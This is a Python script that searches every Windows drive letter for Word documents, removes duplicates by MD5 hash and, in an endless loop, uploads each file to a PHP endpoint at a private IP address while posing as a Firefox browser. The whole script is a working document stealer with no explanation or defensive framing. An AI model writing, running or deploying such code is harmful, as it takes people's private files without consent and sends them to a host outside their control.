import os
import time
import requests
import hashlib
import string
import threading
from queue import Queue


# init
exist_file = []
rules = (".doc",".docx")
# rules = (".doc",".docx",".ppt","pptx")
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",}

# calc file md5
def CalcMD5(filepath):
    with open(filepath,'rb') as f:
        md5obj = hashlib.md5()
        md5obj.update(f.read())
        hash = md5obj.hexdigest()
        # print(hash)
        return hash  

# Traversal files
class Traversaler(threading.Thread):
    def __init__(self, t_name, queue):
        threading.Thread.__init__(self, name=t_name)
        self.data=queue
    def run(self):
        for le in string.ascii_uppercase:
            source_dir = "{}:/".format(le) 
            print("{} has completed traversal".format(source_dir))
            for root, _, files in os.walk(source_dir):  
                for file in files:  
                    if file.endswith(rules):
                        file_dir = os.path.join(root, file) 
                        self.data.put(file_dir) 
        print ("%s: %s is finish Traversal !" %(time.ctime(), self.getName()))


# Upload files
class Uploader(threading.Thread):
    def __init__(self, t_name, queue):
        threading.Thread.__init__(self, name=t_name)
        self.data=queue
    def run(self):
        while not self.data.empty():
            file_dir = self.data.get() 
            file_md5 = CalcMD5(file_dir)
            if not file_md5 in exist_file:
                try:  
                    print(file_dir)
                    f = open(file_dir, "rb")
                    file = {'uploaded': f}
                    r = requests.post('http://192.168.234.90/up.php', files=file,headers=headers)
                    time.sleep(2)
                    exist_file.append(file_md5)
                except Exception as e:
                    raise
        print ("%s: %s finished!" %(time.ctime(), self.getName()))


def main():
    queue = Queue()
    Traversal = Traversaler('Tra.', queue)
    Upload = Uploader('Upr.', queue)
    Traversal.start()
    Traversal.join()
    Upload.start()
    Upload.join()
    print ('All threads terminate!')


if __name__ == '__main__':
    while True:
       main()
       time.sleep(10)